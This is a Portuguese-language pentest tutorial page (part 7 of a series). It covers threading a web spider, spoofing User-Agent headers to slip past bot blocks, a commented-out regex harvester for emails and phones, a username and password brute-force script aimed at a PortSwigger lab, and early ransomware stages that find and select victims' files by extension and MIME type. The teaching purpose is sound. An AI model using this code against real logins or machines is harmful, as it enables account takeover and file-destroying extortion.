<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8"/>
        <link rel="icon" href="imagens/favicon.ico"/>
        <title>Aprenda Python Pentest</title>
        <link rel="stylesheet" href="css/estilo.css"/>
    </head>
    <body>
        <div>
            <header>
                <h1>Aprenda Python Pentest</h1>
                <menu>
                    <li><a href="index.html">Página Inicial</a></li>
                    <li><a href="contato.html">Contato!</a></li>
                    <li><a href="tudo-sobre-python-pentest-1.html">Tudo sobre Python Pentest Parte 1!</a></li>
                    <li><a href="tudo-sobre-python-pentest-2.html">Tudo sobre Python Pentest Parte 2!</a></li>
                    <li><a href="tudo-sobre-python-pentest-3.html">Tudo sobre Python Pentest Parte 3!</a></li>
                    <li><a href="tudo-sobre-python-pentest-4.html">Tudo sobre Python Pentest Parte 4!</a></li>
                    <li><a href="tudo-sobre-python-pentest-5.html">Tudo sobre Python Pentest Parte 5!</a></li>
                    <li><a href="tudo-sobre-python-pentest-6.html">Tudo sobre Python Pentest Parte 6!</a></li>
                    <li><a href="tudo-sobre-python-pentest-7.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Python Pentest Parte 7!</a></li>
                    <li><a href="tudo-sobre-python-pentest-8.html">Tudo sobre Python Pentest Parte 8!</a></li>
                    <li><a href="tudo-sobre-python-pentest-9.html">Tudo sobre Python Pentest Parte 9!</a></li>
                    <li><a href="tudo-sobre-python-pentest-10.html">Tudo sobre Python Pentest Parte 10!</a></li>
                </menu>
            </header>
           
<h2>Tudo sobre Python Pentest Parte 7</h2>

<h3>Threads no Spider</h3>

<p>Podemos também adicionar threads no programa, primeiramente, retire as linkas re, html e soup e coloque elas na função findLinks, assim:</p>

<pre>
<code>
def findLinks(url):
    re = requests.get(url)
    html = re.text
    soup = BeautifulSoup(html, "html.parser")
    
    # Os fors ficarão tudo aqui embaixo
</code>
</pre>

<p>Daí, basta retirar todas as variáveis iguais a elas do código, deixando apenas a invocação da função findLinks, assim:</p>

<pre>
<code>
findLinks(url)
</code>
</pre>

<p>Pra implementar as threads, importe threading, e altere a invocação dentro do for assim:</p>

<pre>
<code>
th = threading.Thread(target = findLinks, args = (url,)) # Importe threading
th.start()
</code>
</pre>

<p>Mas ele vai trabalhar com um monte de requisições e vai dar uns problemas. Para isso, podemos adicionar um semáforo, no começo do código, antes das funções, coloque apenas isso:</p>

<pre>
<code>
global semaforo
semaforo = threading.Semaphore(3)
</code>
</pre>

<p>E na função findLinks, identar tudo dentro do with semaforo, assim:</p>

<pre>
<code>
def findLinks(url):
    with semaforo:
        cont = 0
        while True:
            try:
                re = requests.get(url)
                break
            except requests.exceptions.SSLError:
                try:
                    re = requests.get(url, verify = False)
                    break
                except requests.exceptions.ConnectionError:
                    time.sleep(2)
            except requests.exceptions.ConnectionError:
                time.sleep(2) # Importe time
            
            if cont == 4:
                return 0 # Sai da função
            
            cont += 1

        html = re.text
        soup = BeautifulSoup(html, "html.parser")
        
        # O restante continua a mesma coisa, só que identado
</code>
</pre>

<h3>Bloqueio de Bots</h3>

<p>É muito comum a gente ter bloqueios de bots, que podem ser um problema no spider. Vamos supor esse simples programa:</p>

<pre>
<code>
import requests

re = requests.get("https://4d3358.com/spider/pagina1/bot.php")

print(re.text)    
</code>
</pre>

<p>O user agent passado é algo como <q>python-requests/2.32.3</q>, quando acessamos o mesmo por um browser, ele já retorna algo como isso:</p>

<pre>
<code>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
</code>
</pre>

<p>Com isso, podemos ver que alguns sites bloqueiam bots de scripts como o Python, justamente pra evitar ataques do tipo.</p>

<p>Pra passar um user agent qualquer, podemos fazer assim:</p>

<pre>
<code>
import requests

hd = {"User-Agent": "Seu User Agent aqui"}

re = requests.get("https://4d3358.com/spider/pagina1/bot.php", headers = hd)

print(re.text)
</code>
</pre>

<p>Daí, é só passar qualquer user-agent, como o exemplificado acima.</p>

<pre>
<code>
hd = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0"}
</code>
</pre>

<p>Mas pode ser que o site tenha uma proteção para, por exemplo, ocultar e-mails e telefones de sites, algo de proteção das próprias hospedagens, até mesmo no Inspecionar Elemento do navegador pode ser bloqueado, porque a página só exibe os dados se processarem Javascript.</p>

<!--, isso pode ser burlado também com uma biblioteca em Python, que simula o interpretador Javascript do navegador, para isso instale as bibliotecas requests_html e lxml_html_clean e deixe o código assim:</p>

<pre>
<code>
from requests_html import HTMLSession

hd = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0"}

session = HTMLSession()

re = session.get("https://4d3358.com/spider/pagina1/bot.php", headers = hd)

print(re.text)
</code>
</pre>

<p>E pra renderizar o HTML e consequentemente o Javascript, substitua o último print por isso:</p>

<pre>
<code>
re.html.render()

print(re.html.text)
</code>
</pre>

<p>PS: Ele poderá instalar o Chromium na primeira vez, pode dar erros no Windows, portanto, é preferível utilizar o Linux.</p>

-->

<p>Uma forma mais eficiente de burlar esse tipo de bot, é utilizar um Captcha.</p>

<!--
Expressões Regulares

Podemos usar expressões regulares para extrair informações como e-mails.

Abaixo do código escrito pra burlar os bots, podemos fazer assim, no lugar do último print:

html = re.html.text

emailRe = r"[a-z0-9_-]+@[a-z0-9_-]+.[a-z.]+" # r significa expressões regulares

emails = re.findall(emailRe, html) # Retorna uma lista

print(emails)

Para funcionar também com telefones, faça assim:

emailRe = r"[a-z0-9_-]+@[a-z0-9_-]+.[a-z.]+" # r significa expressões regulares
telRe = r"\+?\d{0,2}\s?\(\d{2}\)\s?\d{4,5}\s?-?\d{4}"

emails = re.findall(emailRe, html) # Retorna uma lista
telefones = re.findall(telRe, html)

print(emails)
print(telefones)

Daí podemos salvar tudo isso numa função:

from requests_html import HTMLSession

def getInfo(url):
    hd = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0"}

    session = HTMLSession()

    re = session.get(url, headers = hd)

    re.html.render()

    html = re.html.text

    emailRe = r"[a-z0-9_-]+@[a-z0-9_-]+.[a-z.]+" # r significa expressões regulares
    telRe = r"\+?\d{0,2}\s?\(\d{2}\)\s?\d{4,5}\s?-?\d{4}"

    emails = re.findall(emailRe, html) # Retorna uma lista
    telefones = re.findall(telRe, html)

-->

<h3>Requisições com Python</h3>

<p></p>Pra exemplificar, entre nesse site e crie uma conta: <a href="https://portswigger.net/" target="_blank">https://portswigger.net/</a>

<p>Depois, acesse o laboratório dele indo aqui e procure o "Username enumeration via different responses": <a href="https://portswigger.net/web-security/all-labs#authentication" target="_blank">https://portswigger.net/web-security/all-labs#authentication</a></p>

<p>Clique em Access the Lab e ele abrirá o site de exemplo pra testarmos.</p>

<p>Entre na página de login e digite um nome de usuário e senha qualquer pra ver se ele mostra alguma mensagem de erro de login. Com isso podemos fazer esse programa:</p>

<pre>
<code>
import requests

url = "https://0a2d007404c984d28049178f00fc0031.web-security-academy.net/login"
form = {"username": "carlos", "password": "123"}
hd = {"Content-Type": "application/x-www-form-urlencoded"}

re = requests.post(url, data = form, headers = hd)

print(re.text)
</code>
</pre>

<p>Daí, é só ver se no HTML ele também retorna o texto de login inválido. Deixe o código assim:</p>

<pre>
<code>
import requests

url = "https://0a2d007404c984d28049178f00fc0031.web-security-academy.net/login"
user = "carlos"
form = {"username": user, "password": "123"}
hd = {"Content-Type": "application/x-www-form-urlencoded"}

re = requests.post(url, data = form, headers = hd)

if "Invalid username" not in re.text:
    print(user)
</code>
</pre>

<p>Salve <a href="files/wordlist-users-menor.txt" target="_blank">essa wordlist</a> e altere o código assim:</p>

<pre>
<code>
import requests

url = "https://0a2d007404c984d28049178f00fc0031.web-security-academy.net/login"
hd = {"Content-Type": "application/x-www-form-urlencoded"}

with open("wordlist-users.txt") as arqUser:
    for u in arqUser.readlines():
        u = u.replace("\n", "")

        print(f"Testando {u}", end = "")

        form = {"username": u, "password": "123"}
        re = requests.post(url, data = form, headers = hd)

        print(" " * 30, end = "\r")

        if "Invalid username" not in re.text:
            print(u)
            break
</code>
</pre>

<p>No caso, ele só vai exibir se o usuário existir no banco de dados.</p>

<p>Daí, é só alterar assim pra ele pegar a senha, com <a href="files/wordlist-senhas-menor.txt" target="_blank">essa wordlist</a>:</p>

<pre>
<code>
with open("wordlist-senhas.txt") as arqPass:
    for p in arqPass.readlines():
        p = p.replace("\n", "")
        form = {"username": "admin", "password": p}

        print(f"Testando {p}", end = "")
        
        re = requests.post(url, data = form, headers = hd)
        
        print(" " * 30, end = "\r")

        if "Incorrect password" not in re.text:
            print(p)
            break
</code>
</pre>

<h3>Listando Arquivos do Sistema</h3>

<p>Podemos fazer um exemplo tipo um ransomware pra entender como o mesmo funciona, nesse caso é preferível fazer no Windows.</p>

<p>Um ransomware funciona da seguinte forma, nessa ordem:</p>

<ul>
    <li>Lista os arquivos.</li>
    <li>Identifica os arquivos alvos (documentos, mídias, etc.).</li>
    <li>Criptografa eles.</li>
    <li>Te solta um alerta.</li>
</ul>

<p>Pra listar a raiz do sistema, simplesmente fazemos isso:</p>

<pre>
<code>
import os

print(os.listdir("/"))
</code>
</pre>

<p>No caso acima, ele listará a raiz do sistema, mas colocará arquivos e pastas na mesma lista. Pra listar só as pastas, fazemos assim:</p>

<pre>
<code>
import os

for fl in os.listdir("/"):
    if os.path.isdir(f"/{fl}"):
        print(f"/{fl}/")
</code>
</pre>

<p>Reescrevendo com uma função:</p>

<pre>
<code>
import os

def listarDir(path):
    for fl in os.listdir(path):
        if os.path.isdir(f"{path}{fl}"):
            print(f"{path}{fl}/")

listarDir("/")
</code>
</pre>

<p>Salvando os arquivos numa lista:</p>

<pre>
<code>
import os

def listarDir(path):
    for fl in os.listdir(path):
        if os.path.isdir(f"{path}{fl}"):
            dirs.append(f"{path}{fl}/")
            print(f"{path}{fl}/")

global dirs
dirs = list()
listarDir("/")

if len(dirs) >= 0:
    print(dirs)
</code>
</pre>

<p>Depois, é só alterar o último if assim, pra listar recursivamente os diretórios:</p>

<pre>
<code>
if len(dirs) >= 0:
    for d in dirs:
        listarDir(d)
</code>
</pre>

<p>PS: Pode dar alguns problemas de permissão, pra isso, altere a função assim:</p>

<pre>
<code>
def listarDir(path):
    try:
        for fl in os.listdir(path):
            if os.path.isdir(f"{path}{fl}"):
                dirs.append(f"{path}{fl}/")
                print(f"{path}{fl}/")
    except PermissionError:
        pass
</code>
</pre>

<p>Só que isso, vai fazer ele listar muitas pastas, o que pode travar o sistema. No caso, nós podemos fazer assim, pra listar apenas as pastas mais importantes, como no caso, a Users:</p>

<pre>
<code>
dirs = list()
listarDir("/Users/")
</code>
</pre>

<p>PS: Podemos remover o print da função, pra deixar o script mais leve.</p>

<p>Pra usar threads, podemos fazer assim:</p>

<pre>
<code>
if len(dirs) >= 0:
    thrd = list()
    for d in dirs:
        th = threading.Thread(target = listarDir, args = (d,)) # Importe threading
        thrd.append(th)
        th.start()
        
    for t in thrd:
        t.join()

print("Finalizou!")
</code>
</pre>

<p>Altere a função assim e declare uma lista global pra verificar os arquivos, pela extensão:</p>

<pre>
<code>
def listarDir(path):
    try:
        for fl in os.listdir(path):
            if os.path.isdir(f"{path}{fl}"):
                dirs.append(f"{path}{fl}/")
            elif fl.split(".")[-1] in ("png", "pdf", "jpg", "jpeg", "mp4"):
                if os.path.isfile(f"{path}{fl}"):
                    files.append(f"{path}{fl}") # Sem a barra
    except PermissionError:
        pass

global files
files = list()
global dirs
dirs = list()
listarDir("/Users/")
</code>
</pre>

<p>E no final do código, podemos colocar um print pra mostrar os arquivos:</p>

<pre>
<code>
print("Finalizou!")
print(files)
</code>
</pre>

<p>PS: O ideal é verificar arquivos pelo MimeType, que aprenderemos mais pra frente.</p>

<h3>Analisando Mime Type</h3>

<p>A forma como mostramos anteriormente pra identificar arquivos foi pela extensão, mas isso pode ser burlado caso a extensão seja alterada, até porque pra alguns sistemas (como o Linux e os baseados em Unix no geral) a extensão não importa muito, mas sim o MimeType, que é o que o arquivo em si é.</p>

<p>Podemos dar um cat (Linux) ou type (Windows) num arquivo como um PNG ou um MP4, e podemos ver inúmeros caracteres incompreensíveis pra nós. Geralmente nos primeiros bytes que fica a assinatura do arquivo (isso é muito usado em engenharia reversa), e geralmente os primeiros bytes (que podem ser visualizados num programa que lê hexadecimal) identificam um arquivo (como um PNG, que qualquer arquivo do tipo tem a assinatura do começo igual, é como um header).</p>

<p>Veja um exemplo de um header em hexa de um arquivo JPEG, por exemplo:</p>

<pre>
<code>
FF D8 FF E0 00 10 4A 46    49 46 00 01 01 00 00 01 
00 01 00 00 FF FE 00 3B    43 52 45 41 54 4F 52 3A 
20 67 64 2D 6A 70 65 67    20 76 31 2E 30 20 28 75 
73 69 6E 67 20 49 4A 47    20 4A 50 45 47 20 76 36 
32 29 2C 20 71 75 61 6C    69 74 79 20 3D 20 39 30    
</code>
</pre>

<p>Vamos instalar duas bibliotecas no Python, a <code>python_magic</code> e a <code>python_magic_bin</code>, colocar uma imagem na pasta do projeto e criar um novo arquivo de teste assim:</p>

<pre>
<code>
import magic

fMagic = magic.Magic()
fType = fMagic.from_file("imagem.jpg")

print(fType)
</code>
</pre>

<p>Pra pegar só o MimeType, faça assim no construtor:</p>

<pre>
<code>
fMagic = magic.Magic(mime = True)
</code>
</pre>

<p>Aqui teremos a lista dos MimeTypes: <a href="https://mimetype.io/all-types" target="_blank">https://mimetype.io/all-types</a></p>

<p>Daí, no arquivo de Ransom, basta colocar essa função aqui nele:</p>

<pre>
<code>
def checkFile(file): # Importe magic
    fMagic = magic.Magic(mime = True)
    fType = str(fMagic.from_file(file))
    
    if fType in ("image/jpeg", "image/png", "image/gif", "audio/mpeg", "video/mp4", "application/pdf", "text/plain"): # Coloque vários MimeTypes
        files.append(file)
</code>
</pre>

<p>E altere o if else da função listarDir assim:</p>

<pre>
<code>
for fl in os.listdir(path):
    if os.path.isdir(f"{path}{fl}"):
        dirs.append(f"{path}{fl}/")
    else:
        checkFile(f"{path}{fl}")
</code>
</pre>

<p>Como o código acima acabará dando um erro, fora de qualquer função, declare o fMagic como global, assim:</p>

<pre>
<code>
global fMagic
fMagic = magic.Magic(mime = True)
</code>
</pre>

<p>Daí, é só retirar a declaração dele na função checkFile, deixando ela assim:</p>

<pre>
<code>
def checkFile(file): # Importe magic
    try:
        fType = str(fMagic.from_file(file))
    
        if fType in ("image/jpeg", "image/png", "image/gif", "audio/mpeg", "video/mp4", "application/pdf", "text/plain"): # Coloque vários MimeTypes
            files.append(file)
    except:
        pass
</code>
</pre>

<p>Podemos melhorar a exibição, fazendo assim no lugar do último print:</p>

<pre>
<code>
for fl in files:
    print(fl)
</code>
</pre>

<ul>
    <li><a href="tudo-sobre-python-pentest-6.html">Parte Anterior da Matéria!</a></li>
    <li><a href="tudo-sobre-python-pentest-8.html">Continuação da Matéria!</a></li>
</ul>

        </div>
    </body>
</html>